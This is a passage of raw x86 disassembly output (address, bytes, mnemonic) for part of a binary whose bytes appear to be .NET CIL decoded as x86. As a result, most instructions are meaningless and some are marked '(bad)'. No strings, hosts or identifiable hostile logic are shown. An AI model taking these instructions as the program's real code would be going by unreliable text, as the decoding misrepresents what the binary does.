  404844:	05 28 2d 00 00       	add    $0x2d28,%eax
  404849:	0a 2d 07 16 0c dd    	or     0xdd0c1607,%ch
  40484f:	4b                   	dec    %ebx
  404850:	01 00                	add    %eax,(%eax)
  404852:	00 02                	add    %al,(%edx)
  404854:	7b 67                	jnp    0x4048bd
  404856:	00 00                	add    %al,(%eax)
  404858:	04 3a                	add    $0x3a,%al
  40485a:	80 00 00             	addb   $0x0,(%eax)
  40485d:	00 07                	add    %al,(%edi)
  40485f:	7b 47                	jnp    0x4048a8
  404861:	00 00                	add    %al,(%eax)
  404863:	04 6f                	add    $0x6f,%al
  404865:	49                   	dec    %ecx
  404866:	00 00                	add    %al,(%eax)
  404868:	06                   	push   %es
  404869:	6f                   	outsl  %ds:(%esi),(%dx)
  40486a:	23 00                	and    (%eax),%eax
  40486c:	00 0a                	add    %cl,(%edx)
  40486e:	13 04 12             	adc    (%edx,%edx,1),%eax
  404871:	04 28                	add    $0x28,%al
  404873:	24 00                	and    $0x0,%al
  404875:	00 0a                	add    %cl,(%edx)
  404877:	2d 41 02 1a 25       	sub    $0x251a0241,%eax
  40487c:	0a 7d 64             	or     0x64(%ebp),%bh
  40487f:	00 00                	add    %al,(%eax)
  404881:	04 02                	add    $0x2,%al
  404883:	11 04 7d 6a 00 00 04 	adc    %eax,0x400006a(,%edi,2)
  40488a:	02 7c 65 00          	add    0x0(%ebp,%eiz,2),%bh
  40488e:	00 04 12             	add    %al,(%edx,%edx,1)
  404891:	04 02                	add    $0x2,%al
  404893:	28 2d 00 00 2b dd    	sub    %ch,0xdd2b0000
  404899:	1c 01                	sbb    $0x1,%al
  40489b:	00 00                	add    %al,(%eax)
  40489d:	02 7b 6a             	add    0x6a(%ebx),%bh
  4048a0:	00 00                	add    %al,(%eax)
  4048a2:	04 13                	add    $0x13,%al
  4048a4:	04 02                	add    $0x2,%al
  4048a6:	7c 6a                	jl     0x404912
  4048a8:	00 00                	add    %al,(%eax)
  4048aa:	04 fe                	add    $0xfe,%al
  4048ac:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4048b1:	02 15 25 0a 7d 64    	add    0x647d0a25,%dl
  4048b7:	00 00                	add    %al,(%eax)
  4048b9:	04 12                	add    $0x12,%al
  4048bb:	04 28                	add    $0x28,%al
  4048bd:	26 00 00             	add    %al,%es:(%eax)
  4048c0:	0a 0d 07 7b 47 00    	or     0x477b07,%cl
  4048c6:	00 04 09             	add    %al,(%ecx,%ecx,1)
  4048c9:	16                   	push   %ss
  4048ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4048cb:	4a                   	dec    %edx
  4048cc:	00 00                	add    %al,(%eax)
  4048ce:	06                   	push   %es
  4048cf:	13 07                	adc    (%edi),%eax
  4048d1:	07                   	pop    %es
  4048d2:	11 07                	adc    %eax,(%edi)
  4048d4:	7d 49                	jge    0x40491f
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	04 38                	add    $0x38,%al
  4048da:	87 00                	xchg   %eax,(%eax)
  4048dc:	00 00                	add    %al,(%eax)
  4048de:	07                   	pop    %es
  4048df:	02 7b 68             	add    0x68(%ebx),%bh
  4048e2:	00 00                	add    %al,(%eax)
  4048e4:	04 7d                	add    $0x7d,%al
  4048e6:	49                   	dec    %ecx
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 07                	add    $0x7,%al
  4048eb:	7b 47                	jnp    0x404934
  4048ed:	00 00                	add    %al,(%eax)
  4048ef:	04 02                	add    $0x2,%al
  4048f1:	7b 68                	jnp    0x40495b
  4048f3:	00 00                	add    %al,(%eax)
  4048f5:	04 6f                	add    $0x6f,%al
  4048f7:	4b                   	dec    %ebx
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	06                   	push   %es
  4048fb:	13 08                	adc    (%eax),%ecx
  4048fd:	07                   	pop    %es
  4048fe:	7b 47                	jnp    0x404947
  404900:	00 00                	add    %al,(%eax)
  404902:	04 11                	add    $0x11,%al
  404904:	08 6f 48             	or     %ch,0x48(%edi)
  404907:	00 00                	add    %al,(%eax)
  404909:	06                   	push   %es
  40490a:	6f                   	outsl  %ds:(%esi),(%dx)
  40490b:	2b 00                	sub    (%eax),%eax
  40490d:	00 0a                	add    %cl,(%edx)
  40490f:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  404915:	00 00                	add    %al,(%eax)
  404917:	0a 2d 3e 02 1b 25    	or     0x251b023e,%ch
  40491d:	0a 7d 64             	or     0x64(%ebp),%bh
  404920:	00 00                	add    %al,(%eax)
  404922:	04 02                	add    $0x2,%al
  404924:	11 05 7d 6b 00 00    	adc    %eax,0x6b7d
  40492a:	04 02                	add    $0x2,%al
  40492c:	7c 65                	jl     0x404993
  40492e:	00 00                	add    %al,(%eax)
  404930:	04 12                	add    $0x12,%al
  404932:	05 02 28 2e 00       	add    $0x2e2802,%eax
  404937:	00 2b                	add    %ch,(%ebx)
  404939:	de 7e 02             	fidivrs 0x2(%esi)
  40493c:	7b 6b                	jnp    0x4049a9
  40493e:	00 00                	add    %al,(%eax)
  404940:	04 13                	add    $0x13,%al
  404942:	05 02 7c 6b 00       	add    $0x6b7c02,%eax
  404947:	00 04 fe             	add    %al,(%esi,%edi,8)
  40494a:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40494f:	02 15 25 0a 7d 64    	add    0x647d0a25,%dl
  404955:	00 00                	add    %al,(%eax)
  404957:	04 12                	add    $0x12,%al
  404959:	05 28 2d 00 00       	add    $0x2d28,%eax
  40495e:	0a 2d 04 16 0c de    	or     0xde0c1604,%ch
  404964:	39 07                	cmp    %eax,(%edi)
  404966:	02 7b 67             	add    0x67(%ebx),%bh
  404969:	00 00                	add    %al,(%eax)
  40496b:	04 7d                	add    $0x7d,%al
  40496d:	4b                   	dec    %ebx
  40496e:	00 00                	add    %al,(%eax)
  404970:	04 17                	add    $0x17,%al
  404972:	0c de                	or     $0xde,%al
  404974:	29 de                	sub    %ebx,%esi
  404976:	03 26                	add    (%esi),%esp
  404978:	de 00                	fiadds (%eax)
  40497a:	16                   	push   %ss
  40497b:	0c de                	or     $0xde,%al
  40497d:	20 13                	and    %dl,(%ebx)
  40497f:	09 02                	or     %eax,(%edx)
  404981:	1f                   	pop    %ds
  404982:	fe                   	(bad)
  404983:	7d 64                	jge    0x4049e9
  404985:	00 00                	add    %al,(%eax)
  404987:	04 02                	add    $0x2,%al
  404989:	14 7d                	adc    $0x7d,%al
  40498b:	69 00 00 04 02 7c    	imul   $0x7c020400,(%eax),%eax
  404991:	65 00 00             	add    %al,%gs:(%eax)
  404994:	04 11                	add    $0x11,%al
  404996:	09 28                	or     %ebp,(%eax)
  404998:	98                   	cwtl
  404999:	00 00                	add    %al,(%eax)
  40499b:	0a de                	or     %dh,%bl
  40499d:	1b 02                	sbb    (%edx),%eax
  40499f:	1f                   	pop    %ds
  4049a0:	fe                   	(bad)
  4049a1:	7d 64                	jge    0x404a07
  4049a3:	00 00                	add    %al,(%eax)
  4049a5:	04 02                	add    $0x2,%al
  4049a7:	14 7d                	adc    $0x7d,%al
  4049a9:	69 00 00 04 02 7c    	imul   $0x7c020400,(%eax),%eax
  4049af:	65 00 00             	add    %al,%gs:(%eax)
  4049b2:	04 08                	add    $0x8,%al
  4049b4:	28 99 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ecx)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	41                   	inc    %ecx
  4049bd:	34 00                	xor    $0x0,%al
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	00 00                	add    %al,(%eax)
  4049c3:	00 2a                	add    %ch,(%edx)
  4049c5:	00 00                	add    %al,(%eax)
  4049c7:	00 25 03 00 00 4f    	add    %ah,0x4f000003
  4049cd:	03 00                	add    (%eax),%eax
  4049cf:	00 03                	add    %al,(%ebx)
  4049d1:	00 00                	add    %al,(%eax)
  4049d3:	00 01                	add    %al,(%ecx)
  4049d5:	00 00                	add    %al,(%eax)
  4049d7:	01 00                	add    %eax,(%eax)
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	00 0e                	add    %cl,(%esi)
  4049dd:	00 00                	add    %al,(%eax)
  4049df:	00 48 03             	add    %cl,0x3(%eax)
  4049e2:	00 00                	add    %al,(%eax)
  4049e4:	56                   	push   %esi
  4049e5:	03 00                	add    (%eax),%eax
  4049e7:	00 20                	add    %ah,(%eax)
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	00 0b                	add    %cl,(%ebx)
  4049ed:	00 00                	add    %al,(%eax)
  4049ef:	01 13                	add    %edx,(%ebx)
  4049f1:	30 02                	xor    %al,(%edx)
  4049f3:	00 3f                	add    %bh,(%edi)
  4049f5:	00 00                	add    %al,(%eax)
  4049f7:	00 20                	add    %ah,(%eax)
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	11 12                	adc    %edx,(%edx)
  4049fd:	00 28                	add    %ch,(%eax)
  4049ff:	74 00                	je     0x404a01
  404a01:	00 0a                	add    %cl,(%edx)
  404a03:	7d 73                	jge    0x404a78
  404a05:	00 00                	add    %al,(%eax)
  404a07:	04 12                	add    $0x12,%al
  404a09:	00 02                	add    %al,(%edx)
  404a0b:	7d 75                	jge    0x404a82
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	04 12                	add    $0x12,%al
  404a11:	00 03                	add    %al,(%ebx)
  404a13:	7d 74                	jge    0x404a89
  404a15:	00 00                	add    %al,(%eax)
  404a17:	04 12                	add    $0x12,%al
  404a19:	00 15 7d 72 00 00    	add    %dl,0x727d
  404a1f:	04 12                	add    $0x12,%al
  404a21:	00 7c 73 00          	add    %bh,0x0(%ebx,%esi,2)
  404a25:	00 04 12             	add    %al,(%edx,%edx,1)
  404a28:	00 28                	add    %ch,(%eax)
  404a2a:	2f                   	das
  404a2b:	00 00                	add    %al,(%eax)
  404a2d:	2b 12                	sub    (%edx),%edx
  404a2f:	00 7c 73 00          	add    %bh,0x0(%ebx,%esi,2)
  404a33:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a36:	76 00                	jbe    0x404a38
  404a38:	00 0a                	add    %cl,(%edx)
  404a3a:	2a 00                	sub    (%eax),%al
  404a3c:	13 30                	adc    (%eax),%esi
  404a3e:	02 00                	add    (%eax),%al
  404a40:	3f                   	aas
  404a41:	00 00                	add    %al,(%eax)
  404a43:	00 21                	add    %ah,(%ecx)
  404a45:	00 00                	add    %al,(%eax)
  404a47:	11 12                	adc    %edx,(%edx)
  404a49:	00 28                	add    %ch,(%eax)
  404a4b:	74 00                	je     0x404a4d
  404a4d:	00 0a                	add    %cl,(%edx)
  404a4f:	7d 7b                	jge    0x404acc
  404a51:	00 00                	add    %al,(%eax)
  404a53:	04 12                	add    $0x12,%al
  404a55:	00 02                	add    %al,(%edx)
  404a57:	7d 7d                	jge    0x404ad6
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	04 12                	add    $0x12,%al
  404a5d:	00 03                	add    %al,(%ebx)
  404a5f:	7d 7c                	jge    0x404add
  404a61:	00 00                	add    %al,(%eax)
  404a63:	04 12                	add    $0x12,%al
  404a65:	00 15 7d 7a 00 00    	add    %dl,0x7a7d
  404a6b:	04 12                	add    $0x12,%al
  404a6d:	00 7c 7b 00          	add    %bh,0x0(%ebx,%edi,2)
  404a71:	00 04 12             	add    %al,(%edx,%edx,1)
  404a74:	00 28                	add    %ch,(%eax)
  404a76:	30 00                	xor    %al,(%eax)
  404a78:	00 2b                	add    %ch,(%ebx)
  404a7a:	12 00                	adc    (%eax),%al
  404a7c:	7c 7b                	jl     0x404af9
  404a7e:	00 00                	add    %al,(%eax)
  404a80:	04 28                	add    $0x28,%al
  404a82:	76 00                	jbe    0x404a84
  404a84:	00 0a                	add    %cl,(%edx)
  404a86:	2a 00                	sub    (%eax),%al
  404a88:	13 30                	adc    (%eax),%esi
  404a8a:	03 00                	add    (%eax),%eax
  404a8c:	48                   	dec    %eax
  404a8d:	00 00                	add    %al,(%eax)
  404a8f:	00 00                	add    %al,(%eax)
  404a91:	00 00                	add    %al,(%eax)
  404a93:	00 02                	add    %al,(%edx)
  404a95:	2d 08 16 8d 2e       	sub    $0x2e8d1608,%eax
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 10                	add    %edx,(%eax)
  404a9e:	00 73 9d             	add    %dh,-0x63(%ebx)
  404aa1:	00 00                	add    %al,(%eax)
  404aa3:	0a 25 02 6f 9e 00    	or     0x9e6f02,%ah
  404aa9:	00 0a                	add    %cl,(%edx)
  404aab:	25 03 6f 9e 00       	and    $0x9e6f03,%eax
  404ab0:	00 0a                	add    %cl,(%edx)
  404ab2:	7e 86                	jle    0x404a3a
  404ab4:	00 00                	add    %al,(%eax)
  404ab6:	04 25                	add    $0x25,%al
  404ab8:	2d 17 26 7e 85       	sub    $0x857e2617,%eax
  404abd:	00 00                	add    %al,(%eax)
  404abf:	04 fe                	add    $0xfe,%al
  404ac1:	06                   	push   %es
  404ac2:	54                   	push   %esp
  404ac3:	00 00                	add    %al,(%eax)
  404ac5:	06                   	push   %es
  404ac6:	73 9f                	jae    0x404a67
  404ac8:	00 00                	add    %al,(%eax)
  404aca:	0a 25 80 86 00 00    	or     0x8680,%ah
  404ad0:	04 28                	add    $0x28,%al
  404ad2:	31 00                	xor    %eax,(%eax)
  404ad4:	00 2b                	add    %ch,(%ebx)
  404ad6:	28 1b                	sub    %bl,(%ebx)
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	2b 2a                	sub    (%edx),%ebp
  404adc:	13 30                	adc    (%eax),%esi
  404ade:	04 00                	add    $0x0,%al
  404ae0:	33 00                	xor    (%eax),%eax
  404ae2:	00 00                	add    %al,(%eax)
  404ae4:	22 00                	and    (%eax),%al
  404ae6:	00 11                	add    %dl,(%ecx)
  404ae8:	73 41                	jae    0x404b2b
  404aea:	00 00                	add    %al,(%eax)
  404aec:	06                   	push   %es
  404aed:	0a 03                	or     (%ebx),%al
  404aef:	16                   	push   %ss
  404af0:	91                   	xchg   %eax,%ecx
  404af1:	17                   	pop    %ss
  404af2:	33 1e                	xor    (%esi),%ebx
  404af4:	06                   	push   %es
  404af5:	17                   	pop    %ss
  404af6:	7d 6c                	jge    0x404b64
  404af8:	00 00                	add    %al,(%eax)
  404afa:	04 06                	add    $0x6,%al
  404afc:	02 03                	add    (%ebx),%al
  404afe:	17                   	pop    %ss
  404aff:	28 4a 00             	sub    %cl,0x0(%edx)
  404b02:	00 06                	add    %al,(%esi)
  404b04:	7d 6d                	jge    0x404b73
  404b06:	00 00                	add    %al,(%eax)
  404b08:	04 06                	add    $0x6,%al
  404b0a:	1b 7d 6e             	sbb    0x6e(%ebp),%edi
  404b0d:	00 00                	add    %al,(%eax)
  404b0f:	04 2b                	add    $0x2b,%al
  404b11:	07                   	pop    %es
  404b12:	03 16                	add    (%esi),%edx
  404b14:	91                   	xchg   %eax,%ecx
  404b15:	2c 02                	sub    $0x2,%al
  404b17:	14 2a                	adc    $0x2a,%al
  404b19:	06                   	push   %es
  404b1a:	2a 00                	sub    (%eax),%al
  404b1c:	13 30                	adc    (%eax),%esi
  404b1e:	05 00 19 00 00       	add    $0x1900,%eax
  404b23:	00 23                	add    %ah,(%ebx)
  404b25:	00 00                	add    %al,(%eax)
  404b27:	11 03                	adc    %eax,(%ebx)
  404b29:	8e 69 04             	mov    0x4(%ecx),%gs
  404b2c:	59                   	pop    %ecx
  404b2d:	8d 2e                	lea    (%esi),%ebp
  404b2f:	00 00                	add    %al,(%eax)
  404b31:	01 0a                	add    %ecx,(%edx)
  404b33:	03 04 06             	add    (%esi,%eax,1),%eax
  404b36:	16                   	push   %ss
  404b37:	06                   	push   %es
  404b38:	8e 69 28             	mov    0x28(%ecx),%gs
  404b3b:	a1 00 00 0a 06       	mov    0x60a0000,%eax
  404b40:	2a 00                	sub    (%eax),%al
  404b42:	00 00                	add    %al,(%eax)
  404b44:	13 30                	adc    (%eax),%esi
  404b46:	02 00                	add    (%eax),%al
  404b48:	3f                   	aas
  404b49:	00 00                	add    %al,(%eax)
  404b4b:	00 24 00             	add    %ah,(%eax,%eax,1)
  404b4e:	00 11                	add    %dl,(%ecx)
  404b50:	12 00                	adc    (%eax),%al
  404b52:	28 77 00             	sub    %dh,0x0(%edi)
  404b55:	00 0a                	add    %cl,(%edx)
  404b57:	7d 88                	jge    0x404ae1
  404b59:	00 00                	add    %al,(%eax)
  404b5b:	04 12                	add    $0x12,%al
  404b5d:	00 02                	add    %al,(%edx)
  404b5f:	7d 8a                	jge    0x404aeb
  404b61:	00 00                	add    %al,(%eax)
  404b63:	04 12                	add    $0x12,%al
  404b65:	00 03                	add    %al,(%ebx)
  404b67:	7d 89                	jge    0x404af2
  404b69:	00 00                	add    %al,(%eax)
  404b6b:	04 12                	add    $0x12,%al
  404b6d:	00 15 7d 87 00 00    	add    %dl,0x877d
  404b73:	04 12                	add    $0x12,%al
  404b75:	00 7c 88 00          	add    %bh,0x0(%eax,%ecx,4)
  404b79:	00 04 12             	add    %al,(%edx,%edx,1)
  404b7c:	00 28                	add    %ch,(%eax)
  404b7e:	32 00                	xor    (%eax),%al
  404b80:	00 2b                	add    %ch,(%ebx)
  404b82:	12 00                	adc    (%eax),%al
  404b84:	7c 88                	jl     0x404b0e
  404b86:	00 00                	add    %al,(%eax)
  404b88:	04 28                	add    $0x28,%al
  404b8a:	79 00                	jns    0x404b8c
  404b8c:	00 0a                	add    %cl,(%edx)
  404b8e:	2a 00                	sub    (%eax),%al
  404b90:	13 30                	adc    (%eax),%esi
  404b92:	02 00                	add    (%eax),%al
  404b94:	37                   	aaa
  404b95:	00 00                	add    %al,(%eax)
  404b97:	00 25 00 00 11 12    	add    %ah,0x12110000
  404b9d:	00 28                	add    %ch,(%eax)
  404b9f:	74 00                	je     0x404ba1
  404ba1:	00 0a                	add    %cl,(%edx)
  404ba3:	7d 8d                	jge    0x404b32
  404ba5:	00 00                	add    %al,(%eax)
  404ba7:	04 12                	add    $0x12,%al
  404ba9:	00 02                	add    %al,(%edx)
  404bab:	7d 8e                	jge    0x404b3b
  404bad:	00 00                	add    %al,(%eax)
  404baf:	04 12                	add    $0x12,%al
  404bb1:	00 15 7d 8c 00 00    	add    %dl,0x8c7d
  404bb7:	04 12                	add    $0x12,%al
  404bb9:	00 7c 8d 00          	add    %bh,0x0(%ebp,%ecx,4)
  404bbd:	00 04 12             	add    %al,(%edx,%edx,1)
  404bc0:	00 28                	add    %ch,(%eax)
  404bc2:	33 00                	xor    (%eax),%eax
  404bc4:	00 2b                	add    %ch,(%ebx)
  404bc6:	12 00                	adc    (%eax),%al
  404bc8:	7c 8d                	jl     0x404b57
  404bca:	00 00                	add    %al,(%eax)
  404bcc:	04 28                	add    $0x28,%al
  404bce:	76 00                	jbe    0x404bd0
  404bd0:	00 0a                	add    %cl,(%edx)
  404bd2:	2a 00                	sub    (%eax),%al
  404bd4:	13 30                	adc    (%eax),%esi
  404bd6:	04 00                	add    $0x0,%al
  404bd8:	43                   	inc    %ebx
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	00 00                	add    %al,(%eax)
  404bdf:	00 7e a2             	add    %bh,-0x5e(%esi)
  404be2:	00 00                	add    %al,(%eax)
  404be4:	0a 2c 1e             	or     (%esi,%ebx,1),%ch
  404be7:	03 04 91             	add    (%ecx,%edx,4),%eax
  404bea:	03 04 17             	add    (%edi,%edx,1),%eax
  404bed:	58                   	pop    %eax
  404bee:	91                   	xchg   %eax,%ecx
  404bef:	1e                   	push   %ds
  404bf0:	62 60 03             	bound  %esp,0x3(%eax)
  404bf3:	04 18                	add    $0x18,%al
  404bf5:	58                   	pop    %eax
  404bf6:	91                   	xchg   %eax,%ecx
  404bf7:	1f                   	pop    %ds
  404bf8:	10 62 60             	adc    %ah,0x60(%edx)
  404bfb:	03 04 19             	add    (%ecx,%ebx,1),%eax
  404bfe:	58                   	pop    %eax
  404bff:	91                   	xchg   %eax,%ecx
  404c00:	1f                   	pop    %ds
  404c01:	18 62 60             	sbb    %ah,0x60(%edx)
  404c04:	2a 03                	sub    (%ebx),%al
  404c06:	04 19                	add    $0x19,%al
  404c08:	58                   	pop    %eax
  404c09:	91                   	xchg   %eax,%ecx
  404c0a:	03 04 18             	add    (%eax,%ebx,1),%eax
  404c0d:	58                   	pop    %eax
  404c0e:	91                   	xchg   %eax,%ecx
  404c0f:	1e                   	push   %ds
  404c10:	62 60 03             	bound  %esp,0x3(%eax)
  404c13:	04 17                	add    $0x17,%al
  404c15:	58                   	pop    %eax
  404c16:	91                   	xchg   %eax,%ecx
  404c17:	1f                   	pop    %ds
  404c18:	10 62 60             	adc    %ah,0x60(%edx)
  404c1b:	03 04 91             	add    (%ecx,%edx,4),%eax
  404c1e:	1f                   	pop    %ds
  404c1f:	18 62 60             	sbb    %ah,0x60(%edx)
  404c22:	2a 00                	sub    (%eax),%al
  404c24:	13 30                	adc    (%eax),%esi
  404c26:	04 00                	add    $0x0,%al
  404c28:	4a                   	dec    %edx
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	00 23                	add    %ah,(%ebx)
  404c2d:	00 00                	add    %al,(%eax)
  404c2f:	11 1a                	adc    %ebx,(%edx)
  404c31:	8d 2e                	lea    (%esi),%ebp
  404c33:	00 00                	add    %al,(%eax)
  404c35:	01 0a                	add    %ecx,(%edx)
  404c37:	7e a2                	jle    0x404bdb
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	0a 2c 1e             	or     (%esi,%ebx,1),%ch
  404c3e:	06                   	push   %es
  404c3f:	16                   	push   %ss
  404c40:	03 d2                	add    %edx,%edx
  404c42:	9c                   	pushf
  404c43:	06                   	push   %es
  404c44:	17                   	pop    %ss
  404c45:	03 1e                	add    (%esi),%ebx
  404c47:	63 d2                	arpl   %edx,%edx
  404c49:	9c                   	pushf
  404c4a:	06                   	push   %es
  404c4b:	18 03                	sbb    %al,(%ebx)
  404c4d:	1f                   	pop    %ds
  404c4e:	10 63 d2             	adc    %ah,-0x2e(%ebx)
  404c51:	9c                   	pushf
  404c52:	06                   	push   %es
  404c53:	19 03                	sbb    %eax,(%ebx)
  404c55:	1f                   	pop    %ds
  404c56:	18 63 d2             	sbb    %ah,-0x2e(%ebx)
  404c59:	9c                   	pushf
  404c5a:	2b 1c 06             	sub    (%esi,%eax,1),%ebx
  404c5d:	19 03                	sbb    %eax,(%ebx)
  404c5f:	d2 9c 06 18 03 1e 63 	rcrb   %cl,0x631e0318(%esi,%eax,1)
  404c66:	d2 9c 06 17 03 1f 10 	rcrb   %cl,0x101f0317(%esi,%eax,1)
  404c6d:	63 d2                	arpl   %edx,%edx
  404c6f:	9c                   	pushf
  404c70:	06                   	push   %es
  404c71:	16                   	push   %ss
  404c72:	03 1f                	add    (%edi),%ebx
  404c74:	18 63 d2             	sbb    %ah,-0x2e(%ebx)
  404c77:	9c                   	pushf
  404c78:	06                   	push   %es
  404c79:	2a 00                	sub    (%eax),%al
  404c7b:	00 1b                	add    %bl,(%ebx)
  404c7d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c80:	57                   	push   %edi
  404c81:	01 00                	add    %eax,(%eax)
  404c83:	00 26                	add    %ah,(%esi)
  404c85:	00 00                	add    %al,(%eax)
  404c87:	11 02                	adc    %eax,(%edx)
  404c89:	7b 72                	jnp    0x404cfd
  404c8b:	00 00                	add    %al,(%eax)
  404c8d:	04 0a                	add    $0xa,%al
  404c8f:	02 7b 75             	add    0x75(%ebx),%bh
  404c92:	00 00                	add    %al,(%eax)
  404c94:	04 0b                	add    $0xb,%al
  404c96:	06                   	push   %es
  404c97:	39 a0 00 00 00 02    	cmp    %esp,0x2000000(%eax)
  404c9d:	02 7b 74             	add    0x74(%ebx),%bh
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	04 8d                	add    $0x8d,%al
  404ca4:	2e 00 00             	add    %al,%cs:(%eax)
  404ca7:	01 7d 76             	add    %edi,0x76(%ebp)
  404caa:	00 00                	add    %al,(%eax)
  404cac:	04 02                	add    $0x2,%al
  404cae:	16                   	push   %ss
  404caf:	7d 77                	jge    0x404d28
  404cb1:	00 00                	add    %al,(%eax)
  404cb3:	04 02                	add    $0x2,%al
  404cb5:	02 7b 74             	add    0x74(%ebx),%bh
  404cb8:	00 00                	add    %al,(%eax)
  404cba:	04 7d                	add    $0x7d,%al
  404cbc:	78 00                	js     0x404cbe
  404cbe:	00 04 28             	add    %al,(%eax,%ebp,1)
  404cc1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404cc2:	00 00                	add    %al,(%eax)
  404cc4:	0a 26                	or     (%esi),%ah
  404cc6:	28 a4 00 00 0a 26 38 	sub    %ah,0x38260a00(%eax,%eax,1)
  404ccd:	b8 00 00 00 07       	mov    $0x7000000,%eax
  404cd2:	7b 6f                	jnp    0x404d43
  404cd4:	00 00                	add    %al,(%eax)
  404cd6:	04 6f                	add    $0x6f,%al
  404cd8:	73 00                	jae    0x404cda
  404cda:	00 0a                	add    %cl,(%edx)
  404cdc:	2d 07 14 0c dd       	sub    $0xdd0c1407,%eax
  404ce1:	de 00                	fiadds (%eax)
  404ce3:	00 00                	add    %al,(%eax)
  404ce5:	07                   	pop    %es
  404ce6:	7b 6f                	jnp    0x404d57
  404ce8:	00 00                	add    %al,(%eax)
  404cea:	04 02                	add    $0x2,%al
  404cec:	7b 76                	jnp    0x404d64
  404cee:	00 00                	add    %al,(%eax)
  404cf0:	04 02                	add    $0x2,%al
  404cf2:	7b 77                	jnp    0x404d6b
  404cf4:	00 00                	add    %al,(%eax)
  404cf6:	04 02                	add    $0x2,%al
  404cf8:	7b 78                	jnp    0x404d72
  404cfa:	00 00                	add    %al,(%eax)
  404cfc:	04 73                	add    $0x73,%al
  404cfe:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404cff:	00 00                	add    %al,(%eax)
  404d01:	0a 16                	or     (%esi),%dl
  404d03:	28 a6 00 00 0a 6f    	sub    %ah,0x6f0a0000(%esi)
  404d09:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404d0a:	00 00                	add    %al,(%eax)
  404d0c:	0a 13                	or     (%ebx),%dl
  404d0e:	04 12                	add    $0x12,%al
  404d10:	04 28                	add    $0x28,%al
  404d12:	a8 00                	test   $0x0,%al
  404d14:	00 0a                	add    %cl,(%edx)
  404d16:	2d 41 02 16 25       	sub    $0x25160241,%eax
  404d1b:	0a 7d 72             	or     0x72(%ebp),%bh
  404d1e:	00 00                	add    %al,(%eax)
  404d20:	04 02                	add    $0x2,%al
  404d22:	11 04 7d 79 00 00 04 	adc    %eax,0x4000079(,%edi,2)
  404d29:	02 7c 73 00          	add    0x0(%ebx,%esi,2),%bh
  404d2d:	00 04 12             	add    %al,(%edx,%edx,1)
  404d30:	04 02                	add    $0x2,%al
  404d32:	28 34 00             	sub    %dh,(%eax,%eax,1)
  404d35:	00 2b                	add    %ch,(%ebx)
  404d37:	dd a2 00 00 00 02    	frstor 0x2000000(%edx)
  404d3d:	7b 79                	jnp    0x404db8
  404d3f:	00 00                	add    %al,(%eax)
  404d41:	04 13                	add    $0x13,%al
  404d43:	04 02                	add    $0x2,%al
  404d45:	7c 79                	jl     0x404dc0
  404d47:	00 00                	add    %al,(%eax)
  404d49:	04 fe                	add    $0xfe,%al
  404d4b:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  404d50:	02 15 25 0a 7d 72    	add    0x727d0a25,%dl
  404d56:	00 00                	add    %al,(%eax)
  404d58:	04 12                	add    $0x12,%al
  404d5a:	04 28                	add    $0x28,%al
  404d5c:	a9 00 00 0a 0d       	test   $0xd0a0000,%eax
  404d61:	09 2d 09 02 14 7d    	or     %ebp,0x7d140209
  404d67:	76 00                	jbe    0x404d69
  404d69:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  404d6c:	2d 02 02 7b 77       	sub    $0x777b0202,%eax
  404d71:	00 00                	add    %al,(%eax)
  404d73:	04 09                	add    $0x9,%al
  404d75:	58                   	pop    %eax
  404d76:	7d 77                	jge    0x404def
  404d78:	00 00                	add    %al,(%eax)
  404d7a:	04 02                	add    $0x2,%al
  404d7c:	02 7b 78             	add    0x78(%ebx),%bh
  404d7f:	00 00                	add    %al,(%eax)
  404d81:	04 09                	add    $0x9,%al
  404d83:	59                   	pop    %ecx
  404d84:	7d 78                	jge    0x404dfe
  404d86:	00 00                	add    %al,(%eax)
  404d88:	04 02                	add    $0x2,%al
  404d8a:	7b 77                	jnp    0x404e03
  404d8c:	00 00                	add    %al,(%eax)
  404d8e:	04 02                	add    $0x2,%al
  404d90:	7b 74                	jnp    0x404e06
  404d92:	00 00                	add    %al,(%eax)
  404d94:	04 3f                	add    $0x3f,%al
  404d96:	37                   	aaa
  404d97:	ff                   	(bad)
  404d98:	ff                   	(bad)
  404d99:	ff 02                	incl   (%edx)
  404d9b:	7b 76                	jnp    0x404e13
  404d9d:	00 00                	add    %al,(%eax)
  404d9f:	04 0c                	add    $0xc,%al
  404da1:	de 20                	fisubs (%eax)
  404da3:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  404da9:	72 00                	jb     0x404dab
  404dab:	00 04 02             	add    %al,(%edx,%eax,1)
  404dae:	14 7d                	adc    $0x7d,%al
  404db0:	76 00                	jbe    0x404db2
  404db2:	00 04 02             	add    %al,(%edx,%eax,1)
  404db5:	7c 73                	jl     0x404e2a
  404db7:	00 00                	add    %al,(%eax)
  404db9:	04 11                	add    $0x11,%al
  404dbb:	05 28 94 00 00       	add    $0x9428,%eax
  404dc0:	0a de                	or     %dh,%bl
  404dc2:	1b 02                	sbb    (%edx),%eax
  404dc4:	1f                   	pop    %ds
  404dc5:	fe                   	(bad)
  404dc6:	7d 72                	jge    0x404e3a
  404dc8:	00 00                	add    %al,(%eax)
